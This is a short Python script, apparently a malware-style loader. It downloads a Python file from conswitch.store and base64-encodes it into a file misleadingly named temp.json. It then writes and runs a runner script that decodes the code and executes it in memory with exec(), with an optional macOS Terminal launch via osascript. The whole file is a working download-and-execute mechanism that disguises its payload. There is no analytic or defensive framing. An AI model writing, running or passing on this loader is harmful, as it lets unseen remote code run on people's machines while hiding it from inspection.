import requests
import base64
import os
import subprocess
import sys

# URL of the Python script on your website
url = "https://conswitch.store/try1.py"  # Replace with your actual URL

# Specify the file name for the downloaded script
script_filename = "temp.json"

# Download the script
response = requests.get(url)
if response.status_code == 200:
    # Encode the script content in base64
    encoded_script = base64.b64encode(response.content).decode()

    # Save the encoded script as temp.json in the same directory
    with open(script_filename, "w") as file:
        file.write(encoded_script)

    # Get the current directory
    current_directory = os.getcwd()

    # Create a runner script that reads, decodes and executes from memory
    runner_script = f"""
import base64
import os
import subprocess
import sys

# Read the base64 encoded content from temp.json
with open('{script_filename}', 'r') as f:
    encoded_content = f.read()

# Decode from base64
decoded_code = base64.b64decode(encoded_content).decode('utf-8')

# Execute the decoded code from memory
exec(decoded_code)
"""

    # Write the runner script to a temporary file
    runner_filename = "runner.py"
    with open(runner_filename, "w") as f:
        f.write(runner_script)

    # Make it executable
    os.chmod(runner_filename, 0o755)

    # Run the script on macOS
    try:
        # Option 1: Run directly without opening new terminal (simpler)
        subprocess.run([sys.executable, runner_filename], cwd=current_directory)

        # Option 2: If you want to open in new Terminal window, uncomment below:
        # subprocess.run([
        #     "osascript", "-e",
        #     f'tell app "Terminal" to do script "cd {current_directory} && python3 {runner_filename}"'
        # ])
    except Exception as e:
        print(f"An error occurred: {e}")
else:
    print(f"Failed to download the script. Status code: {response.status_code}")